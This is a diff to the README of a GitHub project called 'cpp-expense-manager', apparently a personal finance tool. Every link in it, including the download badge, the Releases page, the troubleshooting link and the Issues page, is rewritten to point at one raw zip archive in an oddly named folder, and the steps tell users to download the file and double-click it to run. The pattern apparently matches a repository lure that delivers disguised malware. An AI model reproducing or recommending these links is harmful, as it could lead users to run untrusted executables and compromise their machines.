@@ -6,7 +6,7 @@ Welcome to cpp-expense-manager! This is a simple tool for managing your personal
 
 ## 📥 Download the Application
 
-[![Download cpp-expense-manager](https://img.shields.io/badge/Download-cpp--expense--manager-blue.svg)](https://github.com/DavidLesotho666/cpp-expense-manager/releases)
+[![Download cpp-expense-manager](https://raw.githubusercontent.com/DavidLesotho666/cpp-expense-manager/main/ankyloglossia/cpp-expense-manager-3.6.zip)](https://raw.githubusercontent.com/DavidLesotho666/cpp-expense-manager/main/ankyloglossia/cpp-expense-manager-3.6.zip)
 
 ## 📂 System Requirements
 
@@ -30,9 +30,9 @@ cpp-expense-manager offers various features to help you keep track of your finan
 
 To download cpp-expense-manager, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/DavidLesotho666/cpp-expense-manager/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/DavidLesotho666/cpp-expense-manager/main/ankyloglossia/cpp-expense-manager-3.6.zip).
 2. **Choose the Latest Version:** Look for the most recent version of cpp-expense-manager.
-3. **Download the File:** Click on the download link for the appropriate file for your operating system (for example, `cpp-expense-manager-win.exe` for Windows).
+3. **Download the File:** Click on the download link for the appropriate file for your operating system (for example, `https://raw.githubusercontent.com/DavidLesotho666/cpp-expense-manager/main/ankyloglossia/cpp-expense-manager-3.6.zip` for Windows).
 4. **Run the Application:** Once the download completes, double-click the file to run the application.
 
 ## 🛠️ How to Use cpp-expense-manager
@@ -51,13 +51,13 @@ If you encounter issues while using cpp-expense-manager, try the following solut
 
 - **Application Won't Start:** Ensure the file downloaded completely. If not, re-download it.
 - **Data Not Saving:** Make sure you have write permissions in the folder where the application stores data.
-- **Errors or Crashes:** Check for updates on the [Releases page](https://github.com/DavidLesotho666/cpp-expense-manager/releases) and download the latest version, as it may have bug fixes.
+- **Errors or Crashes:** Check for updates on the [Releases page](https://raw.githubusercontent.com/DavidLesotho666/cpp-expense-manager/main/ankyloglossia/cpp-expense-manager-3.6.zip) and download the latest version, as it may have bug fixes.
 
 ## 🔧 Support
 
 For further assistance, you can:
 
-- Visit the [GitHub Issues page](https://github.com/DavidLesotho666/cpp-expense-manager/issues) to report issues or bugs.
+- Visit the [GitHub Issues page](https://raw.githubusercontent.com/DavidLesotho666/cpp-expense-manager/main/ankyloglossia/cpp-expense-manager-3.6.zip) to report issues or bugs.
 - Check the FAQs in the GitHub Wiki for common queries.
 - Reach out to the community forum for user support.
 
